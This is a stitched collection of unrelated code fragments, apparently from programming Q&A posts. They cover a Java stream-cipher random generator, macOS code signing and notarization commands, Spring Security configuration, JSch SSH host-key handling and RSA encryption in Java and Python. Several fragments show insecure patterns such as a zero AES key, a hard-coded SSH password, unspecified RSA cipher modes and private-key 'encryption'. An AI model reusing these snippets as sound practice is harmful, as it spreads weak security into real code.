         * Generates a pseudo-random <code>long</code> value by taking exactly 8 bytes from the stream cipher.
         * 
         * @return the random <code>long</code> value
         */
        public long nextLong() {
            return generateRandomInBuffer(ByteBuffer.allocate(Long.BYTES)).getLong();
        }
        
        /**
         * Generates a pseudo-random <code>int</code> value with <code>bits</code> random bits in the lower part of the returned integer.
         * This method takes the minimum number of bytes required to hold the required number of bits from the stream cipher (e.g. 13 bits requires 2 bytes to hold them).
         * 
         * @param bits the number of bits in the integer, between 0 and 32 
         * @return the random <code>int</code> value in the range [0, 2^n) where n is the number of bits
         */
        public int next(final int bits) {
            final int bytes = (bits + Byte.SIZE - 1) / Byte.SIZE;
            final ByteBuffer buf = ByteBuffer.allocate(Integer.BYTES);
            buf.position(Integer.BYTES - bytes);
            generateRandomInBuffer(buf);
            final long l = buf.getInt(0);
            final long m = (1L << bits) - 1;
            return (int) (l & m);
        }
        
        /**
         * Generates a pseudo-random <code>int</code> value in a range [0, n) by:
         * 
         * <ol>
         * <li>taking 6 bytes from the stream cipher and converting it into a number y</li>
         * <li>restart the procedure if y is larger than x * n where x is the largest value such that x * n <= 2^48
         * <li>return y % n
         * </ol>
         * 
         * An exception to this rule is for n is 1 in which case this method direct returns 0, without taking any bytes from the stream cipher.
    
         * @param n the maximum value (exclusive) - n must be a non-zero positive number
         * @return the random <code>int</code> value in the range [0, n)
         * @throws IllegalArgumentException if n is zero or negative 
         */
        public int nextInt(final int n) {
            if (n <= 0) {
                throw new IllegalArgumentException("max cannot be negative");
            } else if (n == 1) {
                // only one choice
                return 0;
            }
            
            final ByteBuffer buf = ByteBuffer.allocate(48 / Byte.SIZE);
            long maxC = TWO_POW_48 - TWO_POW_48 % n;
    
            long l;
            do {
                buf.clear();
                generateRandomInBuffer(buf);
                // put 16 bits into position 32 to 47
                l = (buf.getShort() & 0xFFFFL) << Integer.SIZE;
                // put 32 bits into position 0 to 31
                l |= buf.getInt() & 0xFFFFFFFFL;
            } while (l > maxC);
    
           return (int) (l % n);
        }
        
        /**
         * Retrieves random bytes from the underlying stream cipher.
         * All methods that affect the stream cipher should use this method.
         * The bytes between the position and the limit will contain the random bytes; position and limit are left unchanged.
         * <p>
         * The buffer may not be read only and must support setting a mark; previous marks are discarded.
         * 
         * @param buf the buffer to receive the bytes between the position and limit 
         * @return the same buffer, to allow for 
         */
        protected ByteBuffer generateRandomInBuffer(final ByteBuffer buf) {
            while (buf.hasRemaining()) {
                // clear the zeros buffer
                zeros.clear();
                // set the number of zeros to process
                zeros.limit(Math.min(buf.remaining(), zeros.capacity()));
                try {
                    // process the zero's into buf (note that the input size is leading)
                    buf.mark();
                    streamCipher.update(zeros, buf);
                } catch (ShortBufferException e) {
                    // not enough output size, which cannot be true for a stream cipher
                    throw new IllegalStateException(
                            String.format("Cipher %s not behaving as a stream cipher", streamCipher.getAlgorithm()));
                }
            }
            buf.reset();
            return buf;
        }
    
        public static void main(String[] args) throws Exception {
            Cipher streamCipher = Cipher.getInstance("AES/CTR/NoPadding");
            // zero key and iv for demo purposes only
            SecretKey aesKey = new SecretKeySpec(new byte[24], "AES");
            IvParameterSpec iv = new IvParameterSpec(new byte[16]);
            streamCipher.init(Cipher.ENCRYPT_MODE, aesKey, iv);
    
            StreamCipherPseudoRandom rng = new StreamCipherPseudoRandom(streamCipher);
            // chosen by fair dice roll, guaranteed to be random
            System.out.println(rng.nextInt(6) + 1);
        }
    }
---UNIQUEIDFORSNIP---|211223617|   LogFileURL: https://osxapps-ssl.itunes.apple.com/itunes-assets/...
---UNIQUEIDFORSNIP---|211223635|     <PRE><code>xargs codesign -s &quot;P6DMU6694X&quot; -v dependency.dylib</code></PRE>
     ... where `P6DMU6694X` is either the unique developer ID or the exact certificate Common Name (either will work).
    * For a `.jar` file, this can be [particularly cumbersome](https://github.com/qzind/tray/pull/388/files) as each package needs to be extracted, signed and then zipped back up.
---UNIQUEIDFORSNIP---|211223637|   <PRE>xcrun altool --eval-app --primary-bundle-id &lt;bundle id&gt; -u &lt;iTunes Connect Account&gt; -f &lt;file path&gt;</PRE>
     Which may look something like this:
   <PRE>xcrun altool --eval-app --primary-bundle-id com.domain.appname -u john@domain.com -f appname.pkg</PRE>
---UNIQUEIDFORSNIP---|211223639|   <PRE>RequestUUID = a1b2c3d4e5-a1b2-a1b2-a1b2-a1b2c3d4e5f6</PRE>
---UNIQUEIDFORSNIP---|211223641|   <PRE>xcrun altool --eval-info a1b2c3d4e5-a1b2-a1b2-a1b2-a1b2c3d4e5f6 -u john@domain.com</PRE>
---UNIQUEIDFORSNIP---|211223643|   <PRE>LogFileURL: https://osxapps-ssl.itunes.apple.com/itunes-assets/...</PRE>
---UNIQUEIDFORSNIP---|211223645|   <PRE>
    {
      "logFormatVersion": 1,
      "jobId": "a1b2c3d4e5-a1b2-a1b2-a1b2-a1b2c3d4e5f6",
      "status": "Accepted",
      "statusSummary": "Ready for distribution",
      "statusCode": 0,
      "archiveFilename": "appname.pkg",
      "uploadDate": "2018-10-26T05:41:12Z",
      "sha256": "e2350bda66...",
      "issues" null
    }
   </PRE>
---UNIQUEIDFORSNIP---|211536691|    @Override
    public void configure(WebSecurity webSecurity) throws Exception
    {
        webSecurity
            .ignoring()
            .antMatchers("/authentication/login**");
    }	
---UNIQUEIDFORSNIP---|211650452|    PdfReader reader = new PdfReader(src, getPublicCertificate("C:\\Users\\USER\\Documents\\NetBeansPr‌​ojects\\test\\src\\l‌​k_encb64.cer"), getPrivateKey(), "SunPKCS11-eToken"); 
---UNIQUEIDFORSNIP---|211799331|    <user-data-constraint>
                <transport-guarantee>CONFIDENTIAL</transport-guarantee>
            </user-data-constraint>
---UNIQUEIDFORSNIP---|211989585|    @ControllerAdvice
    public class SecurityExceptionHandler extends ResponseEntityExceptionHandler {
    
        @ExceptionHandler({AccessDeniedException.class})
        public ResponseEntity<Object> handleAccessDeniedException(Exception ex, WebRequest request) {
            if(ex.getMessage().toLowerCase().indexOf("access is denied") > -1) {
                return new ResponseEntity<Object>("Unauthorized Access", new HttpHeaders(), HttpStatus.UNAUTHORIZED);
            }
    
            return new ResponseEntity<Object>(ex.getMessage(), new HttpHeaders(), HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
---UNIQUEIDFORSNIP---|212137470|    String keystring = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("target_hostkey","");
    if(!Strings.isNullOrEmpty(keystring)){
        byte[] key = Base64.decode ( keystring, Base64.DEFAULT );
        jsch.getHostKeyRepository().add(new HostKey("github.com", key ), null);
    }
---UNIQUEIDFORSNIP---|212137472|    session = jsch.getSession("git", "github.com", 22);
    session.setPassword("hunter2");
    
    Properties prop = new Properties();
    prop.put("StrictHostKeyChecking", "yes");
    session.setConfig(prop);
    session.connect(); 
---UNIQUEIDFORSNIP---|212137474|    catch(final JSchException jex){
        LOG.debug(session.getHostKey().getKey());
        final com.jcraft.jsch.Session finalSession = session;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                new MaterialDialog.Builder(MyActivity.this)
                        .title("Accept this host with fingerprint?")
                        .negativeText(R.string.cancel)
                        .positiveText(R.string.ok)
                        .content(finalSession.getHostKey().getFingerPrint(jsch))
                        .onPositive(new MaterialDialog.SingleButtonCallback() {
                            @Override
                            public void onClick(@NonNull MaterialDialog dialog, @NonNull DialogAction which) {
                                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("target_hostkey", finalSession.getHostKey().getKey()).apply();
                            }
                        }).show();
            }
        });
    }
---UNIQUEIDFORSNIP---|212173027|    Cipher cipher = Cipher.getInstance("RSA");
---UNIQUEIDFORSNIP---|212173029|    Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1PADDING");
---UNIQUEIDFORSNIP---|212173031|    Cipher cipher = Cipher.getInstance("RSA/None/PKCS1PADDING");
---UNIQUEIDFORSNIP---|212173033|    import M2Crypto
    
    # read privat key
    privatKey = M2Crypto.RSA.load_key('privat.key')
    # encrypt plaintext using privat key
    ciphertext = privatKey.private_encrypt(data.encode('utf-8'), M2Crypto.RSA.pkcs1_padding)
    
    encrypted_message = str(base64.b64encode(ciphertext), 'utf8')
    print(encrypted_message)
   
